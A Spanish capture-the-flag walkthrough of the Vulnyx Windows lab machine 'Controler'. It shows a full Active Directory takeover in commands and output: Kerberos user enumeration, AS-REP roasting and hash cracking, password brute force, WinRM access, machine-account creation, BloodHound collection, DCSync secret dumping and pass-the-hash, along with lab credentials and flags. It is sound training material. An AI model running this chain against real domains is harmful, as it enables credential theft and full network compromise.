---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Controler Vulnyx (Intermediate - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 03:35 EDT
Nmap scan report for 192.168.5.71
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-04 16:35:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:5E:5C:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CONTROLER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CONTROLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5e:5c:f4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: 9h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-04T16:36:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.78 seconds
```

Veremos varios puertos interesantes, entre ellos veremos un `dominio` que seria el `DC` llamado `control.nyx0`, por lo que vamos a realizar un poco de `fuzzing`.

## LDAP

Vamos a ver si `LDAP` permite consultar anonimas de esta forma:

```shell
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

Info:

```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=control,DC=nyx
namingcontexts: CN=Configuration,DC=control,DC=nyx
namingcontexts: CN=Schema,CN=Configuration,DC=control,DC=nyx
namingcontexts: DC=DomainDnsZones,DC=control,DC=nyx
namingcontexts: DC=ForestDnsZones,DC=control,DC=nyx

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Veremos que ha funcionado, por lo que vamos a seguir investigando por esta via a ver que encontramos de informacion sensible.

```shell
ldapdomaindump <IP>
```

Info:

```
[*] Connecting as anonymous user, dumping will probably fail. Consider specifying a username/password to login with 
[*] Connecting to host... 
[*] Binding to host 
[+] Bind OK 
[*] Starting domain dump 
[+] Domain dump finished
```

Pero si leemos dichos archivos no veremos nada interesante, ya que la version anonima no llega a tanto, por lo que vamos a intentar en el puerto `88` de `Kerberos` a ver si realizando fuerza bruta de usuarios, vemos alguno valido.

## Kerberos

La wordlist con la que vamos a probar esta en esta pagina de aqui:

URL = [Wordlist kerberos](https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-Z.Surnames.txt)

Ya que son nombres comunes que podrian estar en dicho dominio de la `A-Z`.

```shell
kerbrute userenum --dc <IP> -d control.nyx <WORDLIST>
```

Info:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/04/25 - Ronnie Flathers @ropnop

2025/08/04 03:52:32 >  Using KDC(s):
2025/08/04 03:52:32 >   192.168.5.71:88

2025/08/04 03:52:52 >  [+] VALID USERNAME:       administrator@control.nyx
2025/08/04 03:54:34 >  [+] VALID USERNAME:       Administrator@control.nyx
2025/08/04 03:58:35 >  [+] VALID USERNAME:       B.LEWIS@control.nyx
2025/08/04 03:59:59 >  Done! Tested 13000 usernames (1 valid) in 90.423 seconds
```

Ahora que tenemos un usuario valido, vamos a jugar con el para intentar obtener su `hash` o contraseña.

## GetNPUsers

Si intentamos realizar un `kerberoasting` para intentar obtener los `hashes` de dicho usuarios, veremos que uno de ellos es vulnerable al mismo.

```shell
impacket-GetNPUsers control.nyx/ -no-pass -usersfile users.txt -dc-ip <IP>
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$B.LEWIS@CONTROL.NYX:8216e5a19a54db9086cc958ee64dfc5d$4f4fc7fc7b9cbe39a8fa75d6d895f5e8873e1481aecbff2f77dadb5367f95101adf0111e312e9f6d14d8962e2d522738157f35fa83e141b450231c823f242a922fd964deb3c3086e574b1043cd127798e67df18a321c875be0d7731b64a0e2708766951a3544792081a92f947089c6404c10b6a3a46b1173bc70628169831cddda3452f72a4231e172d9f3cba5afda5e8bc47fb5913296dba391659892929a81712e21eb055aa5a7034df69c45f676a2c8560ae0e998a09f689165ccf21c4641f41e84fed5fa7de300094d89b1f536d45edac620c3dd61d3aaa7a58eb1f4c976f72c66eaaced88698a40
```

Vemos que en el usuario `B.LEWIS` ha funcionado, por lo que intentaremos `crackear` dicha contraseña del `hash`.

> hash.kerberos

```
$krb5asrep$23$B.LEWIS@CONTROL.NYX:8216e5a19a54db9086cc958ee64dfc5d$4f4fc7fc7b9cbe39a8fa75d6d895f5e8873e1481aecbff2f77dadb5367f95101adf0111e312e9f6d14d8962e2d522738157f35fa83e141b450231c823f242a922fd964deb3c3086e574b1043cd127798e67df18a321c875be0d7731b64a0e2708766951a3544792081a92f947089c6404c10b6a3a46b1173bc70628169831cddda3452f72a4231e172d9f3cba5afda5e8bc47fb5913296dba391659892929a81712e21eb055aa5a7034df69c45f676a2c8560ae0e998a09f689165ccf21c4641f41e84fed5fa7de300094d89b1f536d45edac620c3dd61d3aaa7a58eb1f4c976f72c66eaaced88698a40
```

Ahora vamos a `crackearlo` de esta forma:

```shell
john --format=krb5asrep --wordlist=<WORDLIST> hash.kerberos
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
101Music         ($krb5asrep$23$B.LEWIS@CONTROL.NYX)     
1g 0:00:00:09 DONE (2025-08-04 04:03) 0.1079g/s 1453Kp/s 1453Kc/s 1453KC/s 101eagles..1019904
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que lo hemos echo de forma correcta, por lo que vamos a probar a enumetar el `SAMBA` o intentar entrar por `WinRM` a ver cuales funciona.

## Escalate user j.levy

### enum4linux

Por `WinRM` no va, pero si probamos a enumerar de forma global el `SAMBA` veremos lo siguiente:

```shell
enum4linux -a -u B.LEWIS -p 101Music <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Aug  4 04:07:34 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.5.71
RID Range ........ 500-550,1000-1050
Username ......... 'B.LEWIS'
Password ......... '101Music'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.5.71 )============================


[+] Got domain/workgroup name: CONTROL


 ================================( Nbtstat Information for 192.168.5.71 )================================

Looking up status of 192.168.5.71
        CONTROLER       <00> -         B <ACTIVE>  Workstation Service
        CONTROL         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        CONTROL         <1c> - <GROUP> B <ACTIVE>  Domain Controllers
        CONTROLER       <20> -         B <ACTIVE>  File Server Service
        CONTROL         <1b> -         B <ACTIVE>  Domain Master Browser

        MAC Address = 08-00-27-5E-5C-F4

 ===================================( Session Check on 192.168.5.71 )===================================

                                                                                                                                                             
[+] Server 192.168.5.71 allows sessions using username 'B.LEWIS', password '101Music'                                                                        
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.5.71 )================================
                                                                                                                                                             
Domain Name: CONTROL                                                                                                                                         
Domain Sid: S-1-5-21-2142633474-2248127568-3584646925

[+] Host is part of a domain (not a workgroup)                                                                                                               
                                                                                                                                                             
                                                                                                                                                             
 ===================================( OS information on 192.168.5.71 )===================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.5.71 from srvinfo:                                                                                                               
        192.168.5.71   Wk Sv PDC Tim NT                                                                                                                      
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b


 =======================================( Users on 192.168.5.71 )=======================================
                                                                                                                                                             
index: 0xfb1 RID: 0x453 acb: 0x00000211 Account: a.hansen       Name: Axel Hansen       Desc: (Account Disabled)                                             
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: (Account Enabled)
index: 0xfae RID: 0x450 acb: 0x00010210 Account: b.lewis        Name: Ben Lewis Desc: (Account Enabled)
index: 0xfb0 RID: 0x452 acb: 0x00000211 Account: d.petrov       Name: Dave Petrov       Desc: (Account Disabled)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: (Account Disabled)
index: 0xfac RID: 0x44f acb: 0x00000210 Account: j.levy Name: John Levy Desc: (Account Enabled)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfaf RID: 0x451 acb: 0x00000211 Account: m.klein        Name: Mike Klein        Desc: (Account Disabled)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[j.levy] rid:[0x44f]
user:[b.lewis] rid:[0x450]
user:[m.klein] rid:[0x451]
user:[d.petrov] rid:[0x452]
user:[a.hansen] rid:[0x453]

 =================================( Share Enumeration on 192.168.5.71 )=================================
                                                                                                                                                             
do_connect: Connection to 192.168.5.71 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                      

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.5.71                                                                                                                 
                                                                                                                                                             
//192.168.5.71/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//192.168.5.71/C$       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                            
//192.168.5.71/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//192.168.5.71/NETLOGON Mapping: OK Listing: OK Writing: N/A
//192.168.5.71/SYSVOL   Mapping: OK Listing: OK Writing: N/A

 ============================( Password Policy Information for 192.168.5.71 )============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.5.71 using B.LEWIS:101Music

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.5.71)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] CONTROL
        [+] Builtin

[+] Password Info for Domain: CONTROL

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000001

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 1

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 10 minutes 
        [+] Locked Account Duration: 10 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Enabled                                                                                                                                 
Minimum Password Length: 7


 =======================================( Groups on 192.168.5.71 )=======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
group:[Server Operators] rid:[0x225]                                                                                                                         
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users                                                           
Group: Guests' (RID: 546) has member: CONTROL\Guest
Group: Guests' (RID: 546) has member: CONTROL\Domain Guests
Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Group: Administrators' (RID: 544) has member: CONTROL\Administrator
Group: Administrators' (RID: 544) has member: CONTROL\Enterprise Admins
Group: Administrators' (RID: 544) has member: CONTROL\Domain Admins
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: CONTROL\Domain Users
Group: IIS_IUSRS' (RID: 568) has member: NT AUTHORITY\IUSR
Group: Remote Management Users' (RID: 580) has member: CONTROL\j.levy

[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
group:[Cert Publishers] rid:[0x205]                                                                                                                          
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\krbtgt                                                                         
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Domain Controllers
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Schema Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Enterprise Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Cert Publishers
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Domain Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Group Policy Creator Owners
Group: Denied RODC Password Replication Group' (RID: 572) has member: CONTROL\Read-only Domain Controllers

[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                  
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
Group: 'Domain Controllers' (RID: 516) has member: CONTROL\CONTROLER$                                                                                        
Group: 'Domain Admins' (RID: 512) has member: CONTROL\Administrator
Group: 'Schema Admins' (RID: 518) has member: CONTROL\Administrator
Group: 'Group Policy Creator Owners' (RID: 520) has member: CONTROL\Administrator
Group: 'Enterprise Admins' (RID: 519) has member: CONTROL\Administrator
Group: 'Domain Users' (RID: 513) has member: CONTROL\Administrator
Group: 'Domain Users' (RID: 513) has member: CONTROL\krbtgt
Group: 'Domain Users' (RID: 513) has member: CONTROL\j.levy
Group: 'Domain Users' (RID: 513) has member: CONTROL\b.lewis
Group: 'Domain Users' (RID: 513) has member: CONTROL\m.klein
Group: 'Domain Users' (RID: 513) has member: CONTROL\d.petrov
Group: 'Domain Users' (RID: 513) has member: CONTROL\a.hansen
Group: 'Domain Guests' (RID: 514) has member: CONTROL\Guest

 ==================( Users on 192.168.5.71 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-5-21-2142633474-2248127568-3584646925                                                                                                                    

[I] Found new SID:                                                                                                                                           
S-1-5-21-2142633474-2248127568-3584646925                                                                                                                    

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-90 and logon username 'B.LEWIS', password '101Music'                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-21-2142633474-2248127568-3584646925 and logon username 'B.LEWIS', password '101Music'                                  
                                                                                                                                                             
S-1-5-21-2142633474-2248127568-3584646925-500 CONTROL\Administrator (Local User)                                                                             
S-1-5-21-2142633474-2248127568-3584646925-501 CONTROL\Guest (Local User)
S-1-5-21-2142633474-2248127568-3584646925-502 CONTROL\krbtgt (Local User)
S-1-5-21-2142633474-2248127568-3584646925-512 CONTROL\Domain Admins (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-513 CONTROL\Domain Users (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-514 CONTROL\Domain Guests (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-515 CONTROL\Domain Computers (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-516 CONTROL\Domain Controllers (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-517 CONTROL\Cert Publishers (Local Group)
S-1-5-21-2142633474-2248127568-3584646925-518 CONTROL\Schema Admins (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-519 CONTROL\Enterprise Admins (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-520 CONTROL\Group Policy Creator Owners (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-521 CONTROL\Read-only Domain Controllers (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-522 CONTROL\Cloneable Domain Controllers (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-525 CONTROL\Protected Users (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-526 CONTROL\Key Admins (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-527 CONTROL\Enterprise Key Admins (Domain Group)
S-1-5-21-2142633474-2248127568-3584646925-1000 CONTROL\CONTROLER$ (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username 'B.LEWIS', password '101Music'                                                                   
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-4150329188-2689105034-2738912072 and logon username 'B.LEWIS', password '101Music'                                  
                                                                                                                                                             
S-1-5-21-4150329188-2689105034-2738912072-500 CONTROLER\Administrator (Local User)                                                                           
S-1-5-21-4150329188-2689105034-2738912072-501 CONTROLER\Guest (Local User)
S-1-5-21-4150329188-2689105034-2738912072-503 CONTROLER\DefaultAccount (Local User)
S-1-5-21-4150329188-2689105034-2738912072-504 CONTROLER\WDAGUtilityAccount (Local User)
S-1-5-21-4150329188-2689105034-2738912072-513 CONTROLER\None (Domain Group)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'B.LEWIS', password '101Music'                        
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-80 and logon username 'B.LEWIS', password '101Music'                                                                   
                                                                                                                                                             
                                                                                                                                                             
 ===============================( Getting printer info for 192.168.5.71 )===============================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Mon Aug  4 04:09:39 2025
```

Veremos cosas interesantes, entre ellas veremos un usuario que no conociamos que esta activado llamado `j.levy` en esta linea:

```
index: 0xfac RID: 0x44f acb: 0x00000210 Account: j.levy Name: John Levy Desc: (Account Enabled)
```

Vamos a probar a realizar `fuerza bruta` con dicho usuario con `netexec` a ver que vemos.

Primero vamos a limpiar el diccionario del `rockyou.txt` de esta forma:

```shell
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou_utf8.txt
```

Ahora si vamos a realizar la fuerza bruta:

```shell
netexec smb <IP> -u j.levy -p rockyou_utf8.txt 
```

Info:

```
..........................<RESTO_DE_CODIGO>........................................
SMB         192.168.5.71    445    CONTROLER        [+] control.nyx\j.levy:Password1
```

Veremos que hemos encontrado la contraseña de dicho usuario, por lo que vamos a intentar obtener una shell con `WinRM` de esta forma.

### evil-winrm

```shell
evil-winrm -i <IP> -u j.levy -p 'Password1'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.levy\Documents> whoami
control\j.levy
```

Por lo que vemos ha funcionado, vamos a leer la `flag` del usuario.

> user.txt

```
587c4dac7a29c5c2a2d98732116e5bee
```

## Escalate Privileges

Si listamos los privilegios veremos lo siguiente:

```shell
whoami /priv
```

Info:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Vemos una linea interesante que es la siguiente:

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

Con esto lo que podemos hacer es lo siguiente:

> **SeMachineAccountPrivilege**

**Clave para escalar privilegios**: Este privilegio permite **crear máquinas en el dominio** (por defecto, hasta 10).

Se podria hacer...

* Crear una máquina con SPN.
* Asociarla a un usuario (como tú).
* Hacer un ataque de **Kerberoasting** o incluso **AS-REP roasting** si configuras mal el SPN.
* Herramienta útil: [`Powermad`](https://github.com/Kevin-Robertson/Powermad) o su equivalente en Python.

Nos lo descargamos al `kali` y nos lo pasamos al `windows` mediante este comando.

```shell
upload Powermad.ps1
```

Info:

```
Info: Uploading /home/kali/Desktop/controler/Powermad.ps1 to C:\Users\j.levy\Desktop\Powermad.ps1
                                        
Data: 180768 bytes of 180768 bytes copied
                                        
Info: Upload successful!
```

Ahora vamos a crear dicha maquina mal configurada...

```powershell
Import-Module .\Powermad.ps1
$SecPass = ConvertTo-SecureString 'Passw0rd123!' -AsPlainText -Force
New-MachineAccount -MachineAccount EvilMachine -Password $SecPass -Domain control.nyx
```

Info:

```
[+] Machine account EvilMachine added
```

Si probamos a dumpearnos mediante esta maquina la informacion no va a funcionar, por lo que vamos a utilizar `BloodHound` para poder enumerar de mejor forma la informacion.

Vamos a descargarnos un script para que nos haga en `.zip` toda la informacion del `DC` de esta forma:

```shell
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.7.0/SharpHound_v2.7.0_windows_x86.zip
```

Lo descomprimimos con `zip SharpHound_v2.7.0_windows_x86.zip`.

Ahora desde el `windows`:

```powershell
upload SharpHound.exe
.\SharpHound.exe -c All
```

Cuando haya terminado, hacemos esto:

```
download <FILE>.zip
```

Teniendo el archivo en el `kali` abriremos la herramienta `BloodHound` poniendo simplemente lo siguiente:

```shell
bloodhound
```

Se nos abrira el navegador, meteremos las credenciales que establecimos cuando instalamos `bloodhound`, si no instalarlo haciendo eso mismo, una vez dentro, importaremos el archivo `.zip`, con esto lo que hara sera cargar los datos de todo el `DC` que ha recopilado.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-04 113600.png" alt=""><figcaption></figcaption></figure>

Ahora que sabemos que el usuario `j.levy` tiene los permisos `AllExtendedRights` podremos dumpearnos los `secretos` del `DC` de esta forma:

```shell
impacket-secretsdump control.nyx0/j.levy:'Password1'@<IP> -just-dc-user administrator
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:48b20d4f3ea31b7234c92b71c90fbff7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9a8c983c709e851258912c3b1d71c9b05faf1724f522b4f32e57f7bef3366773
Administrator:aes128-cts-hmac-sha1-96:0ca176565c5b47fda5e2ab4f53fbb9d3
Administrator:des-cbc-md5:ce9785d980c1a7f8
[*] Cleaning up...
```

Vemos que ha funcionado, por lo que vamos a guardar el `hash` del administrador e intentar `crackearlo` a ver si podemos, pero no sera el caso por lo que haremos un `Pass-The-Hash` de esta forma:

```shell
evil-winrm -i <IP> -u Administrator -H 48b20d4f3ea31b7234c92b71c90fbff7
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
control\administrator
```

Veremos que ha funcionado y estaremos dentro, por lo que leeremos la `flag` de `root`.

> root.txt

```
b43e4c1b7df273b73966bc038774bafd
```
